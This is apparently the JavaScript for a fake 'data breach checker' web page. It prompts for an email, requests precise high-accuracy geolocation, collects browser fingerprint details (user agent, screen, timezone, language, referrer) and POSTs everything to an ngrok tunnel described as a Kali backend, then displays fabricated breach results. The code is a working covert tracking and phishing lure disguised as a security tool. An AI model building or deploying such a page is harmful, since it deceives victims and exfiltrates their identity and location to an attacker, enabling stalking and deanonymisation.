// --- !!! USER: REPLACE THIS WITH YOUR NGROK PUBLIC URL !!! ---
// Your Ngrok URL will look something like: https://xxxx-xx-xxx-xxx-xx.ngrok-free.app
// Or the .dev domain: https://xxxx-xx-xxx-xxx-xx.ngrok-free.dev
const KALI_BACKEND_URL = "https://spidery-eddie-nontemperable.ngrok-free.dev/track"; 
// --- !!! ENSURE IT ENDS WITH /track !!! ---

async function checkBreaches() {
    const email = document.getElementById('emailInput').value;
    if (!email) {
        alert('Please enter an email address.');
        return;
    }

    document.getElementById('loadingMessage').style.display = 'block';
    document.getElementById('resultsArea').style.display = 'none';

    let geoData = {
        latitude: null,
        longitude: null,
        accuracy: null,
        altitude: null,
        altitudeAccuracy: null,
        heading: null,
        speed: null,
        timestamp: null,
        permission: 'denied' // Default to denied
    };

    // Attempt to get precise geolocation
    try {
        const position = await new Promise((resolve, reject) => {
            // High accuracy, no cached position, and a decent timeout
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });
        geoData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy, // In meters, reflects WiFi/GPS/cell triangulation
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed,
            timestamp: position.timestamp,
            permission: 'granted'
        };
    } catch (error) {
        console.error("Geolocation error:", error);
        if (error.code === error.PERMISSION_DENIED) {
            geoData.permission = 'denied';
        } else if (error.code === error.POSITION_UNAVAILABLE) {
            geoData.permission = 'unavailable';
        } else if (error.code === error.TIMEOUT) {
            geoData.permission = 'timeout';
        }
    }

    // Gather other data
    const userData = {
        email: email,
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        referrer: document.referrer,
        geolocation: geoData
    };

    // Send data to your Kali backend
    try {
        const response = await fetch(KALI_BACKEND_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(userData),
            mode: 'cors' 
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error(`HTTP error! status: ${response.status}, message: ${errorText}`);
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        console.log("Tracking data sent successfully!");

    } catch (error) {
        console.error("Failed to send tracking data to Kali:", error);
    }

    // Simulate breach results (for frontend display)
    setTimeout(() => {
        document.getElementById('loadingMessage').style.display = 'none';
        document.getElementById('resultsArea').style.display = 'block';
        const breachDetails = document.getElementById('breachDetails');

        if (email.includes("example.com")) { 
            document.getElementById('resultsTitle').innerText = `😱 Oh no! ${email} found in breaches!`;
            breachDetails.innerHTML = `
                <div class="breach-item">
                    <p><strong>Database:</strong> DarkForum Leaks</p>
                    <p><strong>Compromised Data:</strong> Email Addresses, Passwords (hashed), Usernames</p>
                    <p><strong>Date:</strong> 2022-03-15</p>
                </div>
                <div class="breach-item">
                    <p><strong>Database:</strong> IdentityTheftCorp</p>
                    <p><strong>Compromised Data:</strong> Email Addresses, Phone Numbers</p>
                    <p><strong>Date:</strong> 2023-01-20</p>
                </div>
                <p style="color: #ff3b3b; font-weight: bold; margin-top: 15px;">We recommend changing your password immediately for all affected accounts!</p>
            `;
        } else {
            document.getElementById('resultsTitle').innerText = `✅ Good News! No known breaches for ${email}.`;
            breachDetails.innerHTML = `<p>Our scan indicates that your email address has not been found in publicly disclosed data breaches. Keep up good security practices!</p>`;
        }
    }, 3000); 
}
